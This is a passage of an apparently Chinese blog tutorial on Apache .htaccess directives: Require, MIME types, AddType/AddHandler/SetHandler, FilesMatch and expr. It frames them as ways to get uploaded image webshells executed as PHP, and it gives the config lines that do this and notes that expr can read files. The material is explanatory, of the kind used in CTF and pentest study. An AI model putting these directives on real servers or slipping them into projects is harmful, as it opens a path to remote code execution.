2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>内网IP，但不能是10.0.0.5，也不能是guest用户。</p>
+<h4 id="2-Require的特殊姿势"><a href="#2-Require的特殊姿势" class="headerlink" title="2.Require的特殊姿势"></a>2.Require的特殊姿势</h4><p><strong>1.<code>Require not</code> —— 反向条件</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Require not ip 10.0.0.5</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>等价于 <code>&lt;RequireNone&gt;Require ip 10.0.0.5&lt;/RequireNone&gt;</code> 的简写。</p>
+<p><strong>注意</strong>：<code>Require not</code> 不能单独用，必须和其他 Require 组合：</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;RequireAll&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">    Require not ip 10.0.0.5</span><br><span class="line">&lt;/RequireAll&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>也就是说Require not语句必须在Require容器中使用。</p>
+<p><strong>2.<code>Require expr</code> —— 表达式（最强）</strong></p>
+<p>可以写复杂的条件表达式：</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 只允许上午9点到下午5点访问</span><br><span class="line">Require expr &quot;%&#123;TIME_HOUR&#125; -ge 9 &amp;&amp; %&#123;TIME_HOUR&#125; -le 17&quot;</span><br><span class="line"></span><br><span class="line"># 允许特定User-Agent</span><br><span class="line">Require expr &quot;%&#123;HTTP_USER_AGENT&#125; =~ /Mozilla/&quot;</span><br><span class="line"></span><br><span class="line"># 允许特定Cookie</span><br><span class="line">Require expr &quot;%&#123;HTTP:Cookie&#125; =~ /admin=1/&quot;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>这些变量等遇见了不会再说吧</p>
+<h3 id="4-处理器指令"><a href="#4-处理器指令" class="headerlink" title="4.处理器指令"></a>4.处理器指令</h3><p>到了最重点的地方来了，基本上都是通过将上传的图片马等作为php解析连接shell，但是有一些payload太强了。光会解析图片马还不够。</p>
+<h4 id="1-MIME-Type"><a href="#1-MIME-Type" class="headerlink" title="1.MIME Type"></a>1.MIME Type</h4><p>我们在进行文件解析之前得知道什么是MIME Type。</p>
+<p>在进行POST传参的时候请求头中就会多出一个Content-Type字段，如果没有这个字段我们请求体的数据就不会被解析，因为服务器不知道该如何解析这些数据。对应的响应头中也会有这个字段，告诉我们浏览器该如何处理返回的响应体。</p>
+<p>Content-Type中的值就是MIME Type，MIME Type本身并没有什么强制要求我们可以在请求头中随意改动不会影响文件的属性，而是一种协议被HTTP协议中使用。只是辅助信息，和文件本身没有什么关系。</p>
+<p>格式：MIME 类型通常由两部分组成，格式为 主类型&#x2F;子类型。</p>
+<ul>
+<li>主类型（Type）：表示文件的大类，如 text（文本）、image（图像）、application（应用程序数据）等。</li>
+<li>子类型（Subtype）：表示具体的文件格式，如 html（HTML 文件）、jpeg（JPEG 图像）、json（JSON 数据）等。</li>
+</ul>
+<p>以下是常见的 MIME 类型及其用途：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>主类型</th>
+<th>子类型 &#x2F; 示例</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>text</td>
+<td>html, css, plain</td>
+<td>文本文件 (HTML、CSS、纯文本等)</td>
+</tr>
+<tr>
+<td>image</td>
+<td>jpeg, png, gif</td>
+<td>图片文件</td>
+</tr>
+<tr>
+<td>audio</td>
+<td>mp3, wav</td>
+<td>音频文件</td>
+</tr>
+<tr>
+<td>video</td>
+<td>mp4, webm</td>
+<td>视频文件</td>
+</tr>
+<tr>
+<td>application</td>
+<td>json, pdf, octet-stream</td>
+<td>应用程序数据 (JSON、PDF、二进制流等)</td>
+</tr>
+<tr>
+<td>multipart</td>
+<td>form-data</td>
+<td>多部分数据 (如表单上传)</td>
+</tr>
+</tbody></table></div>
+<p>示例</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- .html → text/html</span><br><span class="line">- .css → text/css</span><br><span class="line">- .js → application/javascript</span><br><span class="line">- .jpg → image/jpeg</span><br><span class="line">- .mp3 → audio/mpeg</span><br><span class="line">- .mp4 → video/mp4</span><br><span class="line">- .pdf → application/pdf</span><br><span class="line">- .zip → application/zip</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p><strong>处理器</strong></p>
+<p>在Apache中会将文件后缀名和MIME Type进行映射，然后根据MIME Type去处理文件，为了处理不同的文件Apache中内置了许多处理器</p>
+<p>处理器是<strong>服务器内部用来处理特定类型文件的程序</strong>：</p>
+<ul>
+<li><code>php-script</code> → PHP 解释器</li>
+<li><code>cgi-script</code> → CGI 程序</li>
+<li><code>server-parsed</code> → SSI（服务器端包含）</li>
+</ul>
+<p><strong>MIME 类型和处理器配合工作</strong>：MIME 类型告诉“这是什么文件”，处理器决定“谁来执行它”。</p>
+<h4 id="2-核心指令"><a href="#2-核心指令" class="headerlink" title="2.核心指令"></a>2.核心指令</h4><p><strong>1.<code>AddType</code> —— 添加 MIME 类型映射</strong></p>
+<p><strong>语法</strong>：<code>AddType MIME类型 扩展名 [扩展名...]</code></p>
+<p>示例</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php    # 默认就有，但可覆盖</span><br><span class="line">AddType application/json .json</span><br><span class="line">AddType text/css .css</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>Apache中默认对各种文件后缀有着默认的处理，于是我们就不需要重复将php映射到php后缀的文件上，我们通常将php的MIME类型映射到图片马上面</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg .gif .png</span><br><span class="line"># 让图片文件被当作 PHP 解析</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>原理</strong>：当访问 <code>.jpg</code> 文件时，Apache 查表发现它的 MIME 类型是 <code>application/x-httpd-php</code>，于是交给 PHP 处理器执行。注意MIME类型不是文件带有的，而是Apache配置的。</p>
+<p><strong>2.<code>AddHandler</code> —— 添加处理器映射</strong></p>
+<p><strong>语法</strong>：<code>AddHandler 处理器名称 扩展名 [扩展名...]</code></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .cgi .pl          # CGI 脚本</span><br><span class="line">AddHandler server-parsed .shtml          # SSI 文件</span><br><span class="line">AddHandler php-script .php                # PHP 脚本</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>与 AddType 的区别</strong>：</p>
+<ul>
+<li><code>AddType</code>：告诉“这是什么类型”</li>
+<li><code>AddHandler</code>：告诉“谁来处理这个文件”</li>
+</ul>
+<p>使用方法</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .jpg</span><br><span class="line"># 让 jpg 文件作为 CGI 脚本执行（如果允许执行 CGI）</span><br><span class="line">AddHandler php-script .png</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p><strong>3.<code>SetHandler</code> —— 强制设置处理器</strong></p>
+<p><strong>语法</strong>：<code>SetHandler 处理器名称</code></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># 当前目录所有文件都当 PHP 解析</span><br><span class="line"></span><br><span class="line">SetHandler cgi-script</span><br><span class="line"># 所有文件都当 CGI 执行（危险！）</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>与 AddHandler 的区别</strong>：</p>
+<ul>
+<li><code>AddHandler</code>：基于扩展名选择性地应用</li>
+<li><code>SetHandler</code>：<strong>强制所有文件使用指定处理器</strong>（无视扩展名）</li>
+</ul>
+<p><strong>这是最危险也最强大的指令</strong>——上传一个 <code>image.jpg</code>，里面写 PHP 代码，访问它就直接执行。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(jpg|gif|png)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>只对图片文件强制 PHP 解析，更精确。</p>
+<p>4.<code>ForceType</code> —— 强制 MIME 类型</p>
+<p><strong>语法</strong>：<code>ForceType MIME类型</code></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ForceType application/json</span><br><span class="line"># 所有文件都当作 JSON 返回</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p><strong>5.<code>RemoveType</code> &#x2F; <code>RemoveHandler</code></strong></p>
+<p><strong>作用</strong>：移除之前设置的 MIME 类型或处理器映射</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RemoveType .php    # 移除 .php 的 MIME 类型映射</span><br><span class="line">RemoveHandler .cgi # 移除 .cgi 的处理器映射</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+
+
+<h4 id="3-Files-和-FilesMatch-容器"><a href="#3-Files-和-FilesMatch-容器" class="headerlink" title="3.Files 和 FilesMatch 容器"></a>3.Files 和 FilesMatch 容器</h4><p>之前的配置基本上都必须基于后缀进行配置，无法精确到文件，Files和FilesMatch分别使用文件名和正则精确匹配文件进行配置。</p>
+<p>使用容器匹配文件之后都不需要在指令后面跟上后缀了</p>
+<p><code>&lt;Files&gt;</code></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;shell.php&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p><code>&lt;FilesMatch&gt;</code>（用正则）</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(jpg|gif|png)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>当多个指令冲突时，优先级从高到低：</p>
+<ol>
+<li>**<code>SetHandler</code>**（最强，直接指定处理器）</li>
+<li>**<code>AddHandler</code>**（指定处理器）</li>
+<li>**<code>ForceType</code>**（指定 MIME 类型，间接影响处理器）</li>
+<li>**<code>AddType</code>**（指定 MIME 类型）</li>
+<li><strong>Apache 默认 MIME 类型映射</strong>（<code>mime.types</code> 文件）</li>
+</ol>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/plain .php        # .php 当作纯文本</span><br><span class="line">SetHandler application/x-httpd-php  # 但所有文件都强制 PHP</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>结果：<code>.php</code> 文件<strong>仍然会执行</strong>，因为 <code>SetHandler</code> 优先级更高。</p>
+<h2 id="3-expr表达式"><a href="#3-expr表达式" class="headerlink" title="3.expr表达式"></a>3.expr表达式</h2><p>在htaccess文件中expr可以实现很多意料之外的操作，.htaccess文件一般都需要配合其他webshell实现服务器解析webshell。然而Apache自然有权限去进行文件读取等操作，而且Apache为了实现某些逻辑，必须通过一些代码去读取信息执行操作。</p>
+<p>expr就是htaccess中的表达式语言，很迷你但是可以实现一些基本的逻辑操作。其中file函数可以读取文件内容。</p>
+<p><code>expr</code> 是 Apache 2.4+ 引入的<strong>表达式语言</strong>，类似编程语言中的条件表达式，可以：</p>
+<ul>
+<li>访问请求信息（IP、URI、头等）</li>
+<li>调用内置函数</li>
+<li>执行字符串操作</li>
+<li>进行数值比较</li>
+<li>正则匹配</li>
+</ul>
+<h3 id="1-语法结构"><a href="#1-语法结构" class="headerlink" title="1.语法结构"></a>1.语法结构</h3><p>基本格式</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expr &quot;表达式&quot;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 